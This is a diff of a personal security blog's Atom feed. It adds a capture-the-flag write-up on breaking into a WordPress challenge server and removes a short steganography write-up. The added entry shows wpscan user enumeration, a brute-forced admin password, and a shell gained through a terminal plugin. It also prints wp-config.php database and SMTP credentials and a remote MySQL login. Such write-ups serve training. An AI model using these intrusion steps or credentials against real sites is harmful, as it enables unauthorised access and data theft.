@@ -1,4 +1,285 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="/atom.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2018-08-22T11:40:23+02:00</updated><id>/</id><title type="html">Pxmme</title><subtitle>Cybersec enthusiast.</subtitle><author><name>Pxmme</name></author><entry><title type="html">TJCTF - Central Saving Account</title><link href="/2018/08/12/TJCTF-Write-Up-Central-Saving-Account/" rel="alternate" type="text/html" title="TJCTF - Central Saving Account" /><published>2018-08-12T02:00:15+02:00</published><updated>2018-08-12T02:00:15+02:00</updated><id>/2018/08/12/TJCTF-Write-Up-Central-Saving-Account</id><content type="html" xml:base="/2018/08/12/TJCTF-Write-Up-Central-Saving-Account/">&lt;!-- more --&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="/atom.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2018-08-22T11:41:46+02:00</updated><id>/</id><title type="html">Pxmme</title><subtitle>Cybersec enthusiast.</subtitle><author><name>Pxmme</name></author><entry><title type="html">Nihwk Training CTF - WordPress</title><link href="/2018/08/22/NIHWK-Write-Up-Wordpress/" rel="alternate" type="text/html" title="Nihwk Training CTF - WordPress" /><published>2018-08-22T07:00:00+02:00</published><updated>2018-08-22T07:00:00+02:00</updated><id>/2018/08/22/NIHWK-Write-Up-Wordpress</id><content type="html" xml:base="/2018/08/22/NIHWK-Write-Up-Wordpress/">&lt;!-- more --&gt;
+
+&lt;h2 id=&quot;challenge&quot;&gt;Challenge&lt;/h2&gt;
+
+&lt;p&gt;Can you find the flag inside server? http://jordpress.herokuapp.com/&lt;/p&gt;
+
+&lt;p&gt;[1200 points]&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Written by Lattice&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;initial-thoughts&quot;&gt;Initial thoughts&lt;/h2&gt;
+
+&lt;p&gt;I wanted to do some of the training challenges before the actual CTF coming up this week-end. I did some of the easy ones out of boredom and then looked at this WordPress one. What striked me was that it only had 1 solve and still gave a good amount of points compared to the others. I wondered if it was really hard, or if people just weren’t that much into WordPress exploitation. Anyway, I dived in, seeing in this challenge a nice way to spend my evening at the hotel I was staying in.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/imgs/wphome.png&quot; alt=&quot;Homepage&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here we are. A home page with some articles, unfortunately half-written in a language I do not speak.&lt;/p&gt;
+
+&lt;p&gt;I looked around, tried some common logins at wp-login.php (such as “admin, admin” or “admin, password”…) but nothing worked.&lt;/p&gt;
+
+&lt;p&gt;I figured I needed to start using tools, so I fired up Kali and went for WPSCAN.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wpscan --url http://jordpress.herokuapp.com/&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;wpscan --url http://jordpress.herokuapp.com/ --enumerate p&lt;/code&gt; didn’t gave me much. WordPress’ version was outdated, so a bunch of CVEs poped out, one for getting RCE. I tried it, no luck : it failed.&lt;/p&gt;
+
+&lt;p&gt;I decided to go back to WPSCAN and try something different, a little easier than exploiting a CVE, and see what I could get.&lt;/p&gt;
+
+&lt;p&gt;Since I do not speak mandarin, chinese or whatever this was, I couldn’t really read posts and see what was said and who posted it. So I asked my bilingual friend WPSCAN to do it for me by enumerating users :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+wpscan --url http://jordpress.herokuapp.com/ --enumerate u
+
+[+] Enumerating usernames ...
+[+] Identified the following 1 user/s:
+    +----+-------+---------+
+    | Id | Login | Name    |
+    +----+-------+---------+
+    | 1  | admin | 404 Not |
+    +----+-------+---------+
+[!] Default first WordPress username 'admin' is still used
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;That’s a start. “admin” is still in use, and seems to be the only one… I guess that shall be the entry point.&lt;/p&gt;
+
+&lt;p&gt;Let’s see if we can do something dumb, by bruteforcing the log-in, since XMLRPC was available :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+[+] Starting the password brute forcer
+  [+] [SUCCESS] Login : admin Password : 12345678                                                                                                                        
+
+  Brute Forcing 'admin' Time: 00:00:23
+  +----+-------+------+----------+
+  | Id | Login | Name | Password |
+  +----+-------+------+----------+
+  |    | admin |      | 12345678 |
+  +----+-------+------+----------+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Meeeh. Easier than I thought for this much points. But maybe I’m not done yet. Let’s log-in as admin and see what’s what.&lt;/p&gt;
+
+&lt;p&gt;Once logged in, I saw some plugins being installed but they were all up to date and not really exploitable (akismet…).&lt;/p&gt;
+
+&lt;p&gt;I started thinking about exploits that needed authentication as admin to get RCE, but then I remembered : this WordPress installation, unlike all the other ones I did on HackTheBox, was indeed connected to the world wide web.&lt;/p&gt;
+
+&lt;p&gt;I could just go for plugins’ shopping.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/imgs/wpshop.png&quot; alt=&quot;Shopping&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Searching for “shell”, I found this nice little guy called WPTerm. I then installed it and was able to get a shell, just like that, on the server as dyno user.&lt;/p&gt;
+
+&lt;p&gt;(Thanks to &lt;a href=&quot;https://wordpress.org/plugins/wpterm/&quot;&gt;Jerome Bruandet for this amazing plugin!&lt;/a&gt;)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+u5412:/app $ id
+uid=5412(u5412) gid=5412(dyno) groups=5412(dyno)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Now comes the stupid part. I was so familiar with HTB’s kind of WordPress exploitation that I didn’t even thought about take a breath after I landed that shell.&lt;/p&gt;
+
+&lt;p&gt;I immediately started looking into wp-config.php to gather some credentials.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&amp;lt;?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to &quot;wp-config.php&quot; and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://codex.wordpress.org/Editing_wp-config.php
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'ado77oc5a8ntg8qf');
+
+/** MySQL database username */
+define('DB_USER', 'b7gqhve5j2viqqwd');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'eyekawepi48wol7h');
+
+/** MySQL hostname */
+define('DB_HOST', 'y06qcehxdtkegbeb.cbetxkdyhwsb.us-east-1.rds.amazonaws.com');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+define('WPMS_ON', true);
+define('WPMS_SMTP_PASS', 'Ynnhoj!@34');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         'put your unique phrase here');
+define('SECURE_AUTH_KEY',  'put your unique phrase here');
+define('LOGGED_IN_KEY',    'put your unique phrase here');
+define('NONCE_KEY',        'put your unique phrase here');
+define('AUTH_SALT',        'put your unique phrase here');
+define('SECURE_AUTH_SALT', 'put your unique phrase here');
+define('LOGGED_IN_SALT',   'put your unique phrase here');
+define('NONCE_SALT',       'put your unique phrase here');
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the Codex.
+ *
+ * @link https://codex.wordpress.org/Debugging_in_WordPress
+ */
+define('WP_DEBUG', false);
+
+/* That's all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+    define('ABSPATH', dirname(__FILE__) . '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;And I got excited. I thought “that’s it, the flag must be inside the MySQL db, or then it must have something to do with the WPMS_SMTP_PASS”. Oh boi, was I overthinking this.&lt;/p&gt;
+
+&lt;p&gt;Anyway, I connected to the remote MySQL DB and started looking.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+~# mysql -u b7gqhve5j2viqqwd -p -h y06qcehxdtkegbeb.cbetxkdyhwsb.us-east-1.rds.amazonaws.com -D ado77oc5a8ntg8qf
+Enter password: 
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 6144783
+Server version: 5.7.19-log MySQL Community Server (GPL)
+
+Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [ado77oc5a8ntg8qf]&amp;gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| ado77oc5a8ntg8qf   |
++--------------------+
+2 rows in set (0.16 sec)
+
+MySQL [ado77oc5a8ntg8qf]&amp;gt; use ado77oc5a8ntg8qf;
+Database changed
+MySQL [ado77oc5a8ntg8qf]&amp;gt; show tables;
++----------------------------+
+| Tables_in_ado77oc5a8ntg8qf |
++----------------------------+
+| wp_bp_activity             |
+| wp_bp_activity_meta        |
+| wp_bp_notifications        |
+| wp_bp_notifications_meta   |
+| wp_bp_xprofile_data        |
+| wp_bp_xprofile_fields      |
+| wp_bp_xprofile_groups      |
+| wp_bp_xprofile_meta        |
+| wp_commentmeta             |
+| wp_comments                |
+| wp_links                   |
+| wp_options                 |
+| wp_postmeta                |
+| wp_posts                   |
+| wp_signups                 |
+| wp_term_relationships      |
+| wp_term_taxonomy           |
+| wp_termmeta                |
+| wp_terms                   |
+| wp_usermeta                |
+| wp_users                   |
+| wp_xyz_ips_short_code      |
++----------------------------+
+22 rows in set (0.13 sec)
+
+MySQL [ado77oc5a8ntg8qf]&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;And I looked, and I looked, and I looked… It looked at posts revisions, at users deletions, at posts’ meta… Nothing to be found.&lt;/p&gt;
+
+&lt;p&gt;I went and looked around in /etc. I looked at ssh configuration. I looked at cronjobs. I looked at passwd, I tried some dumb shit like sudoing stuff.&lt;/p&gt;
+
+&lt;p&gt;I started to think about the SMTP password then.&lt;/p&gt;
+
+&lt;p&gt;Hopefully, I had a full bladder by then and had to take a weewee break. While my bladder was unloading itself, I got time to think.&lt;/p&gt;
+
+&lt;p&gt;And then I saw the light.&lt;/p&gt;
+
+&lt;p&gt;``&lt;/p&gt;
+
+&lt;p&gt;Wait a minute… I didn’t even fucking look around! As soon as I landed this shell, I started doing wp-config.php and MySQL enumeration without even doing a proper ls -al in the landing dir!&lt;/p&gt;
+
+&lt;p&gt;``&lt;/p&gt;
+
+&lt;p&gt;Long story short, there was indeed a stupid dir in /app, with the flag in it.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+u5412:/app/123213fda9fd7a089fd8afdsafdsaffdafda $ cat flag
+flag{wordpress_1s_vulnerable!!!!!!!}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Flag was : &lt;code class=&quot;highlighter-rouge&quot;&gt;flag{wordpress_1s_vulnerable!!!!!!!}&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;after-thoughts&quot;&gt;After thoughts&lt;/h2&gt;
+
+&lt;p&gt;Before starting to overthink a challenge, ALWAYS go with the basics. Always assume the actions you need to take in order to get the flag are &lt;strong&gt;dumb&lt;/strong&gt;. If nothing dumb works, you can start thinking.&lt;/p&gt;
+
+&lt;p&gt;All in all, it’s an interesting, even if basic, WordPress exploitation challenge. I was amazed to see that we were only 2 guys to have solved it, when other web challenges, which gave much more points, had so many more solves.&lt;/p&gt;
+
+&lt;p&gt;I guess, as I said earlier, that people are just not into WordPress’ exploitation anymore. :smile:&lt;/p&gt;</content><author><name>Pxmme</name></author><category term="nihwk-training-2018" /><category term="write-up" /><category term="web" /><category term="wordpress" /><summary type="html">Challenge Can you find the flag inside server? http://jordpress.herokuapp.com/ [1200 points] Written by Lattice Initial thoughts I wanted to do some of the training challenges before the actual CTF coming up this week-end. I did some of the easy ones out of boredom and then looked at this WordPress one. What striked me was that it only had 1 solve and still gave a good amount of points compared to the others. I wondered if it was really hard, or if people just weren’t that much into WordPress exploitation. Anyway, I dived in, seeing in this challenge a nice way to spend my evening at the hotel I was staying in. Exploitation Here we are. A home page with some articles, unfortunately half-written in a language I do not speak. I looked around, tried some common logins at wp-login.php (such as “admin, admin” or “admin, password”…) but nothing worked. I figured I needed to start using tools, so I fired up Kali and went for WPSCAN. wpscan --url http://jordpress.herokuapp.com/ and wpscan --url http://jordpress.herokuapp.com/ --enumerate p didn’t gave me much. WordPress’ version was outdated, so a bunch of CVEs poped out, one for getting RCE. I tried it, no luck : it failed. I decided to go back to WPSCAN and try something different, a little easier than exploiting a CVE, and see what I could get. Since I do not speak mandarin, chinese or whatever this was, I couldn’t really read posts and see what was said and who posted it. So I asked my bilingual friend WPSCAN to do it for me by enumerating users : wpscan --url http://jordpress.herokuapp.com/ --enumerate u [+] Enumerating usernames ... [+] Identified the following 1 user/s: +----+-------+---------+ | Id | Login | Name | +----+-------+---------+ | 1 | admin | 404 Not | +----+-------+---------+ [!] Default first WordPress username 'admin' is still used That’s a start. “admin” is still in use, and seems to be the only one… I guess that shall be the entry point. Let’s see if we can do something dumb, by bruteforcing the log-in, since XMLRPC was available : [+] Starting the password brute forcer [+] [SUCCESS] Login : admin Password : 12345678 Brute Forcing 'admin' Time: 00:00:23 +----+-------+------+----------+ | Id | Login | Name | Password | +----+-------+------+----------+ | | admin | | 12345678 | +----+-------+------+----------+ Meeeh. Easier than I thought for this much points. But maybe I’m not done yet. Let’s log-in as admin and see what’s what. Once logged in, I saw some plugins being installed but they were all up to date and not really exploitable (akismet…). I started thinking about exploits that needed authentication as admin to get RCE, but then I remembered : this WordPress installation, unlike all the other ones I did on HackTheBox, was indeed connected to the world wide web. I could just go for plugins’ shopping. Searching for “shell”, I found this nice little guy called WPTerm. I then installed it and was able to get a shell, just like that, on the server as dyno user. (Thanks to Jerome Bruandet for this amazing plugin!) u5412:/app $ id uid=5412(u5412) gid=5412(dyno) groups=5412(dyno) Now comes the stupid part. I was so familiar with HTB’s kind of WordPress exploitation that I didn’t even thought about take a breath after I landed that shell. I immediately started looking into wp-config.php to gather some credentials. &amp;lt;?php /** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don't have to use the web site, you can * copy this file to &quot;wp-config.php&quot; and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://codex.wordpress.org/Editing_wp-config.php * * @package WordPress */ // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define('DB_NAME', 'ado77oc5a8ntg8qf'); /** MySQL database username */ define('DB_USER', 'b7gqhve5j2viqqwd'); /** MySQL database password */ define('DB_PASSWORD', 'eyekawepi48wol7h'); /** MySQL hostname */ define('DB_HOST', 'y06qcehxdtkegbeb.cbetxkdyhwsb.us-east-1.rds.amazonaws.com'); /** Database Charset to use in creating database tables. */ define('DB_CHARSET', 'utf8'); /** The Database Collate type. Don't change this if in doubt. */ define('DB_COLLATE', ''); define('WPMS_ON', true); define('WPMS_SMTP_PASS', 'Ynnhoj!@34'); /**#@+ * Authentication Unique Keys and Salts. * * Change these to different unique phrases! * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service} * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again. * * @since 2.6.0 */ define('AUTH_KEY', 'put your unique phrase here'); define('SECURE_AUTH_KEY', 'put your unique phrase here'); define('LOGGED_IN_KEY', 'put your unique phrase here'); define('NONCE_KEY', 'put your unique phrase here'); define('AUTH_SALT', 'put your unique phrase here'); define('SECURE_AUTH_SALT', 'put your unique phrase here'); define('LOGGED_IN_SALT', 'put your unique phrase here'); define('NONCE_SALT', 'put your unique phrase here'); /**#@-*/ /** * WordPress Database Table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */ $table_prefix = 'wp_'; /** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the Codex. * * @link https://codex.wordpress.org/Debugging_in_WordPress */ define('WP_DEBUG', false); /* That's all, stop editing! Happy blogging. */ /** Absolute path to the WordPress directory. */ if ( !defined('ABSPATH') ) define('ABSPATH', dirname(__FILE__) . '/'); /** Sets up WordPress vars and included files. */ require_once(ABSPATH . 'wp-settings.php'); And I got excited. I thought “that’s it, the flag must be inside the MySQL db, or then it must have something to do with the WPMS_SMTP_PASS”. Oh boi, was I overthinking this. Anyway, I connected to the remote MySQL DB and started looking. ~# mysql -u b7gqhve5j2viqqwd -p -h y06qcehxdtkegbeb.cbetxkdyhwsb.us-east-1.rds.amazonaws.com -D ado77oc5a8ntg8qf Enter password: Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MariaDB monitor. Commands end with ; or \g. Your MySQL connection id is 6144783 Server version: 5.7.19-log MySQL Community Server (GPL) Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. MySQL [ado77oc5a8ntg8qf]&amp;gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | ado77oc5a8ntg8qf | +--------------------+ 2 rows in set (0.16 sec) MySQL [ado77oc5a8ntg8qf]&amp;gt; use ado77oc5a8ntg8qf; Database changed MySQL [ado77oc5a8ntg8qf]&amp;gt; show tables; +----------------------------+ | Tables_in_ado77oc5a8ntg8qf | +----------------------------+ | wp_bp_activity | | wp_bp_activity_meta | | wp_bp_notifications | | wp_bp_notifications_meta | | wp_bp_xprofile_data | | wp_bp_xprofile_fields | | wp_bp_xprofile_groups | | wp_bp_xprofile_meta | | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_signups | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | | wp_xyz_ips_short_code | +----------------------------+ 22 rows in set (0.13 sec) MySQL [ado77oc5a8ntg8qf]&amp;gt; And I looked, and I looked, and I looked… It looked at posts revisions, at users deletions, at posts’ meta… Nothing to be found. I went and looked around in /etc. I looked at ssh configuration. I looked at cronjobs. I looked at passwd, I tried some dumb shit like sudoing stuff. I started to think about the SMTP password then. Hopefully, I had a full bladder by then and had to take a weewee break. While my bladder was unloading itself, I got time to think. And then I saw the light. `` Wait a minute… I didn’t even fucking look around! As soon as I landed this shell, I started doing wp-config.php and MySQL enumeration without even doing a proper ls -al in the landing dir! `` Long story short, there was indeed a stupid dir in /app, with the flag in it. u5412:/app/123213fda9fd7a089fd8afdsafdsaffdafda $ cat flag flag{wordpress_1s_vulnerable!!!!!!!} Flag was : flag{wordpress_1s_vulnerable!!!!!!!} After thoughts Before starting to overthink a challenge, ALWAYS go with the basics. Always assume the actions you need to take in order to get the flag are dumb. If nothing dumb works, you can start thinking. All in all, it’s an interesting, even if basic, WordPress exploitation challenge. I was amazed to see that we were only 2 guys to have solved it, when other web challenges, which gave much more points, had so many more solves. I guess, as I said earlier, that people are just not into WordPress’ exploitation anymore. :smile:</summary></entry><entry><title type="html">TJCTF - Central Saving Account</title><link href="/2018/08/12/TJCTF-Write-Up-Central-Saving-Account/" rel="alternate" type="text/html" title="TJCTF - Central Saving Account" /><published>2018-08-12T02:00:15+02:00</published><updated>2018-08-12T02:00:15+02:00</updated><id>/2018/08/12/TJCTF-Write-Up-Central-Saving-Account</id><content type="html" xml:base="/2018/08/12/TJCTF-Write-Up-Central-Saving-Account/">&lt;!-- more --&gt;
 
 &lt;h2 id=&quot;challenge&quot;&gt;Challenge&lt;/h2&gt;
 
@@ -664,33 +945,4 @@ Password found: tinkerbell
 
 &lt;h2 id=&quot;after-thoughts&quot;&gt;After thoughts&lt;/h2&gt;
 
-&lt;p&gt;Not much. This is the very basic of steganography. I’ve encountered it dozens of times in past CTFs.&lt;/p&gt;</content><author><name>Pxmme</name></author><category term="tjctf-2018" /><category term="write-up" /><category term="forensics" /><summary type="html"></summary></entry><entry><title type="html">TJCTF - Trippy</title><link href="/2018/08/12/TJCTF-Write-Up-Trippy/" rel="alternate" type="text/html" title="TJCTF - Trippy" /><published>2018-08-12T02:00:01+02:00</published><updated>2018-08-12T02:00:01+02:00</updated><id>/2018/08/12/TJCTF-Write-Up-Trippy</id><content type="html" xml:base="/2018/08/12/TJCTF-Write-Up-Trippy/">&lt;!-- more --&gt;
-
-&lt;h2 id=&quot;challenge&quot;&gt;Challenge&lt;/h2&gt;
-
-&lt;p&gt;No description&lt;/p&gt;
-
-&lt;p&gt;[5 points]&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Written by Alaska47&lt;/em&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;initial-thoughts&quot;&gt;Initial thoughts&lt;/h2&gt;
-
-&lt;p&gt;So, we have no description and a gif file. All of this for little to no points. This should be quick.&lt;/p&gt;
-
-&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# wget https://static.tjctf.org/be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif
- 
-~# strings be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif | grep tjctf
-tjctf{w0w}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Meh.&lt;/p&gt;
-
-&lt;p&gt;Flag : &lt;code class=&quot;highlighter-rouge&quot;&gt;tjctf{w0w}&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;after-thoughts&quot;&gt;After thoughts&lt;/h2&gt;
-
-&lt;p&gt;Not much.&lt;/p&gt;</content><author><name>Pxmme</name></author><category term="tjctf-2018" /><category term="write-up" /><category term="misc" /><summary type="html"></summary></entry></feed>
+&lt;p&gt;Not much. This is the very basic of steganography. I’ve encountered it dozens of times in past CTFs.&lt;/p&gt;</content><author><name>Pxmme</name></author><category term="tjctf-2018" /><category term="write-up" /><category term="forensics" /><summary type="html"></summary></entry></feed>
